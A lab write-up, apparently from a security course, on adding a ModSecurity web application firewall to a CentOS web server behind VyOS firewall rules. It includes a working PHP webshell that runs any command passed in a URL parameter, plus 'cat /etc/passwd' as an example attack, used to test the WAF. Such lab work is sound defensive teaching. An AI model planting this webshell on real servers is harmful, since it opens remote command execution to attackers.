# Lab 5.1 - Wazuf WAF
In this lab we are going to augment web01 by adding a web application firewall (WAF).  The wazuh agent should currently be able to forward apache error logs so a good deal of our work is done for us already.  We are then going to run malicious http requests against web01 to see how our WAF performs.

## patch fw01
>[!Warning]
> web01's ability to talk to the WAN and the WANs ability to talk to web01 might be currently restricted.  Updating and patching the server is one of the things we must do from time to time.  VYOS itself cannot filter by domain name such as allowing traffic to updates.centos.org.  It has to be by IP address or subnet.  For this reason, many organizations go to an internal mirror for this purpose.  We will use a work around.

### WAN-to-DMZ
- add a new permanent rule to vyos such that established connections from the DMZ-to-WAN are allowed back through the WAN-to-DMZ
```
set firewall name WAN-to-DMZ rule 1 action accept
set firewall name WAN-to-DMZ rule 1 state established enable
```
### DMZ-to-WAN
temporary rule for software updates that we either delete, disable or discard when complete
```
set firewall name DMZ-to-WAN rule 999 action accept
set firewall name DMZ-to-WAN rule 999 source address 172.16.50.3
```

## Adding mod_security, the core rule set and php to web01
The following command will install mod_security, the core ruleset associated with this layer 7 firewall and the php necessary to make a webshell work.
```
sudo yum install mod_security mod_security_crs php php-common php-opcache php-cli php-gd php-curl php-mysqlnd -y
```
- after installation delete temporary rule on fw01
```
delete firewall name DMZ-to-WAN rule 999
```
- create a php webshell at `/var/www/html/shell.php` on web01
```
<!-- source: https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985 -->
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

while this shell works for commands like `whoami` and `/sbin/ifconfig`, modsecurity will prevent dangerous commands like `cat /etc/passwd` from being executed


